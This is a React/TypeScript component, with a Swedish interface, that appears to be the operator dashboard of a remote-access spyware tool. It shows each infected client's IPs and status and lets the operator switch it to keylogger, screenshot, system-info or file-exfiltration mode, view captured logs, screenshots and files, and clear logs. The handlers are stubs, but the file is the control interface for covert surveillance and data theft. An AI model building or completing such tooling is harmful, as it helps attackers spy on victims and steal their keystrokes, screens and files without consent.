
import React, { useState } from "react";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableHeader, TableRow, TableHead, TableBody, TableCell } from "@/components/ui/table";
import { useToast } from "@/components/ui/use-toast";

import { SystemInfoTab } from "./SystemInfoTab";
import { LogsTab } from "./LogsTab";
import { ScreenshotsTab } from "./ScreenshotsTab";
import { FilesTab } from "./FilesTab";

const SCRIPT_TYPES = [
  { value: "standard", label: "Standard" },
  { value: "keylogger", label: "Keylogger" },
  { value: "screenshot", label: "Screenshot" },
  { value: "system_info", label: "System Info" },
  { value: "file_exfiltration", label: "File Exfiltration" }
];

interface ClientDetailsProps {
  client: any;
}

export function ClientDetails({ client }: ClientDetailsProps) {
  const [activeTab, setActiveTab] = useState("info");
  const [selectedInstruction, setSelectedInstruction] = useState(client.instruction);
  const { toast } = useToast();

  const handlePing = async () => {
    // In a real implementation, call API
    console.log(`Pinging client ${client.id}`);
    toast({
      title: "Ping skickad",
      description: "Kontrollerar status för klienten...",
    });
  };

  const handleClearLogs = async () => {
    // In a real implementation, call API
    console.log(`Clearing logs for client ${client.id}`);
    toast({
      title: "Loggar rensade",
      description: "Alla loggar för klienten har rensats",
    });
  };

  const handleExportLogs = async () => {
    // In a real implementation, call API
    console.log(`Exporting logs for client ${client.id}`);
    toast({
      title: "Loggar exporteras",
      description: "Nedladdning startar snart...",
    });
  };

  const handleUpdateInstruction = async () => {
    // In a real implementation, call API
    console.log(`Updating instruction for client ${client.id} to ${selectedInstruction}`);
    toast({
      title: "Instruktion uppdaterad",
      description: `Klienten kommer nu köra ${selectedInstruction} instruktionen`,
    });
  };

  return (
    <div className="space-y-6">
      <Card>
        <CardHeader className="pb-3">
          <div className="flex items-center justify-between">
            <div>
              <CardTitle className="text-2xl">{client.name} ({client.system})</CardTitle>
              <CardDescription>
                Klient ID: {client.id}
              </CardDescription>
            </div>
            <Badge 
              variant={client.isActive ? "success" : "destructive"}
              className="text-md px-3 py-1"
            >
              {client.isActive ? "Online" : "Offline"}
            </Badge>
          </div>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <h3 className="text-sm font-medium mb-2">Senaste aktivitet</h3>
              <p>{client.lastActivity}</p>
            </div>
            <div>
              <h3 className="text-sm font-medium mb-2">Senaste ping</h3>
              <p>{client.lastPing}</p>
            </div>
            <div>
              <h3 className="text-sm font-medium mb-2">OS</h3>
              <p>{client.os} {client.osVersion}</p>
            </div>
            <div>
              <h3 className="text-sm font-medium mb-2">IP-adress</h3>
              <p>Lokal: {client.ip}<br/>Publik: {client.publicIp}</p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
            <div className="space-y-2">
              <h3 className="text-sm font-medium">Aktuell instruktion</h3>
              <div className="flex gap-2 items-center">
                <Select value={selectedInstruction} onValueChange={setSelectedInstruction}>
                  <SelectTrigger className="w-[180px]">
                    <SelectValue placeholder="Välj instruktion" />
                  </SelectTrigger>
                  <SelectContent>
                    {SCRIPT_TYPES.map(type => (
                      <SelectItem key={type.value} value={type.value}>{type.label}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                <Button onClick={handleUpdateInstruction} disabled={selectedInstruction === client.instruction}>
                  Uppdatera
                </Button>
              </div>
            </div>
            <div className="flex gap-2 items-end">
              <Button onClick={handlePing} variant="outline">
                Ping klient
              </Button>
              <Button onClick={handleExportLogs} variant="outline">
                Exportera loggar
              </Button>
              <Button onClick={handleClearLogs} variant="destructive">
                Rensa loggar
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="grid grid-cols-4 lg:w-[600px]">
          <TabsTrigger value="info">Systeminformation</TabsTrigger>
          <TabsTrigger value="logs">Loggar</TabsTrigger>
          <TabsTrigger value="screenshots">Skärmdumpar</TabsTrigger>
          <TabsTrigger value="files">Filer</TabsTrigger>
        </TabsList>
        <TabsContent value="info" className="mt-6">
          <SystemInfoTab client={client} />
        </TabsContent>
        <TabsContent value="logs" className="mt-6">
          <LogsTab client={client} />
        </TabsContent>
        <TabsContent value="screenshots" className="mt-6">
          <ScreenshotsTab client={client} />
        </TabsContent>
        <TabsContent value="files" className="mt-6">
          <FilesTab client={client} />
        </TabsContent>
      </Tabs>
    </div>
  );
}
